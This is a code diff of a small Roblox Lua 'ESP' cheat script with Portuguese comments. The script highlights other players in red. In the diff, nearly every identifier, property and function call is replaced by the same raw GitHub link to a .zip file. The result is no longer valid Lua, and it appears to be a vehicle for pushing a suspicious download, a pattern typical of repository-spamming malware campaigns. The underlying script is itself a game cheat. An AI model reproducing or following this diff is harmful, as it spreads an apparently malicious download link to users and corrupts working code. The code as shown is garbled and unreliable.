@@ -1,28 +1,28 @@
 --- Script ESP simples
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local LocalPlayer = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip
 local RunService = game:GetService("RunService")
 
 -- Função para criar um ESP para um jogador
 local function createESP(player)
     if player == LocalPlayer then return end -- Ignorar o próprio jogador
-    player.CharacterAdded:Connect(function(character)
-        local highlight = Instance.new("Highlight")
-        highlight.Parent = character
-        highlight.Adornee = character
-        highlight.FillColor = Color3.fromRGB(255, 0, 0) -- Cor do ESP (vermelho)
-        highlight.FillTransparency = 0.5
-        highlight.OutlineTransparency = 0
+    https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip(function(character)
+        local highlight = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip("Highlight")
+        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = character
+        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = character
+        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip(255, 0, 0) -- Cor do ESP (vermelho)
+        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = 0.5
+        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = 0
     end)
 
     -- Caso o jogador já tenha um personagem ao entrar
-    if player.Character then
-        local highlight = Instance.new("Highlight")
-        highlight.Parent = player.Character
-        highlight.Adornee = player.Character
-        highlight.FillColor = Color3.fromRGB(255, 0, 0) -- Cor do ESP (vermelho)
-        highlight.FillTransparency = 0.5
-        highlight.OutlineTransparency = 0
+    if https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip then
+        local highlight = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip("Highlight")
+        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip
+        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip
+        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip(255, 0, 0) -- Cor do ESP (vermelho)
+        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = 0.5
+        https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip = 0
     end
 end
 
@@ -32,6 +32,6 @@ for _, player in ipairs(Players:GetPlayers()) do
 end
 
 -- Adicionar ESP para novos jogadores que entrarem no jogo
-Players.PlayerAdded:Connect(function(player)
+https://raw.githubusercontent.com/3sxz/Pois-/main/charmedly/Pois-.zip(function(player)
     createESP(player)
 end)
